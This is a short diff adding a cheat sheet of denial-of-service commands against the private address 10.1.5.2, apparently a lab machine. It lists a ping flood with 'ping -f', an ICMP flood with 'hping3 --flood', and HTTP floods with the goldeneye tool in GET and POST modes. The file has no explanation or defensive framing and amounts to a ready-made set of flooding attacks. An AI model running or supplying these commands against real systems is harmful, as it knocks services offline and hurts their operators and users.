@@ -1,0 +1,9 @@
+# Ping flood with Ping
+sudo ping -f 10.1.5.2
+
+# Ping flood with hping3
+sudo hping3 -1 --flood 10.1.5.2
+
+# HTTP DoS goldeneye
+sudo python goldeneye.py http://10.1.5.2:80/
+sudo python goldeneye.py http://10.1.5.2:80/ -m post
